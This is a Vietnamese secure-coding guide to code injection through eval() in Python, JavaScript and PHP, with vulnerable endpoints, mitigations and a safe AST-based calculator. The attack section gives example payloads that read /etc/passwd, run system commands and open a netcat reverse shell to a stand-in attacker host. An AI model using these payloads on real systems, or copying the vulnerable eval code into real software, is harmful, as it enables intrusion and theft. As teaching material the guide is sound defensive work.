# Code Injection

> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-94 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

Nhiều ngôn ngữ lập trình cung cấp khả năng **thực thi code động** (dynamic code evaluation) — tức là chuyển đổi một chuỗi văn bản thành code thực thi tại runtime. Các hàm phổ biến bao gồm:

- **Python**: `eval()`, `exec()`, `compile()`
- **JavaScript**: `eval()`, `new Function()`, `setTimeout('code', ms)`
- **PHP**: `eval()`, `assert()`, `preg_replace()` với modifier `/e`

Mục đích thiết kế ban đầu là cho phép xây dựng các hệ thống linh hoạt — ví dụ calculator, template engine, hoặc plugin system. Tuy nhiên, khi đầu vào cho các hàm này đến từ người dùng mà không được kiểm soát, attacker có thể inject code tùy ý.

**Phân biệt với OS Command Injection**: Code Injection thực thi code trong ngữ cảnh của ngôn ngữ lập trình (Python, JS, PHP), trong khi OS Command Injection thực thi lệnh hệ điều hành (shell commands). Code Injection thường nguy hiểm hơn vì attacker có toàn quyền truy cập runtime environment.

Ví dụ sử dụng `eval()` hợp lệ trong một calculator đơn giản:

```python
# Simple calculator — legitimate use of eval (still risky)
expression = "2 + 3 * 4"
result = eval(expression)  # Returns 14
print(f"Result: {result}")
```

## 🔍 Mô tả lỗ hổng

Code Injection xảy ra khi ứng dụng truyền dữ liệu người dùng trực tiếp vào các hàm thực thi code động. Attacker có thể:

- Đọc/ghi file trên server
- Truy cập biến môi trường, secrets, credentials
- Thực thi lệnh hệ thống thông qua runtime (ví dụ `os.system()` trong Python)
- Chiếm quyền điều khiển hoàn toàn server (RCE — Remote Code Execution)

Lỗ hổng này đặc biệt phổ biến trong các ứng dụng cần xử lý biểu thức toán học, template rendering, hoặc JSON/YAML parsing tùy chỉnh.

## ⚔️ Cơ chế tấn công

**Python eval() exploitation**:

```python
# Vulnerable calculator endpoint
user_input = request.args.get('expr')
result = eval(user_input)

# Attacker input to read /etc/passwd:
# expr=__import__('os').popen('cat /etc/passwd').read()

# Attacker input to spawn reverse shell:
# expr=__import__('os').system('nc -e /bin/sh attacker.com 4444')
```

**JavaScript eval() exploitation**:

```javascript
// Vulnerable template processing
app.get('/calc', (req, res) => {
    let expr = req.query.expr;
    let result = eval(expr);  // DANGER: Direct eval of user input
    res.send(`Result: ${result}`);
});

// Attacker payload to read files:
// /calc?expr=require('child_process').execSync('cat /etc/passwd').toString()
```

**PHP eval() exploitation**:

```php
<?php
// Vulnerable dynamic code execution
$code = $_GET['code'];
eval($code);  // DANGER: Arbitrary PHP execution

// Attacker payload:
// ?code=system('whoami');
// ?code=file_get_contents('/etc/passwd');
?>
```

## 🛡️ Biện pháp phòng thủ

1. **Tuyệt đối tránh eval()**: Trong 99% trường hợp, có giải pháp thay thế an toàn hơn. Dùng parser chuyên dụng cho biểu thức toán học.
2. **Whitelist operations**: Nếu bắt buộc xử lý biểu thức, chỉ cho phép toán tử và số, reject mọi thứ khác.
3. **Sandbox execution**: Nếu phải thực thi code động, sử dụng sandbox (Docker container, VM, hoặc restricted environment).
4. **AST-based evaluation**: Parse input thành Abstract Syntax Tree, validate từng node trước khi thực thi.
5. **Content Security Policy**: Trong browser, CSP `script-src` ngăn chặn inline eval.

## 💻 Code Example

```python
# === VULNERABLE CODE ===
from flask import Flask, request

app = Flask(__name__)

@app.route('/calculate')
def calculate():
    expression = request.args.get('expr', '0')
    # DANGER: eval() executes arbitrary Python code
    result = eval(expression)
    return f"Result: {result}"


# === SECURE CODE ===
import ast
import operator
from flask import Flask, request

app = Flask(__name__)

# Whitelist of safe operations
SAFE_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval(expr):
    """Evaluate arithmetic expressions using AST parsing"""
    tree = ast.parse(expr, mode='eval')

    def _eval(node):
        # Only allow numbers
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        # Only allow whitelisted binary operations
        elif isinstance(node, ast.BinOp) and type(node.op) in SAFE_OPS:
            left = _eval(node.left)
            right = _eval(node.right)
            return SAFE_OPS[type(node.op)](left, right)
        # Only allow top-level Expression wrapper
        elif isinstance(node, ast.Expression):
            return _eval(node.body)
        else:
            raise ValueError(f"Unsupported operation: {type(node).__name__}")

    return _eval(tree)

@app.route('/calculate')
def calculate():
    expression = request.args.get('expr', '0')
    try:
        # Safe AST-based evaluation — no arbitrary code execution
        result = safe_eval(expression)
        return f"Result: {result}"
    except (ValueError, SyntaxError) as e:
        return f"Invalid expression", 400
```

## 📚 Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/os-command-injection
- OWASP: https://owasp.org/www-community/attacks/Code_Injection
- CWE: https://cwe.mitre.org/data/definitions/94.html
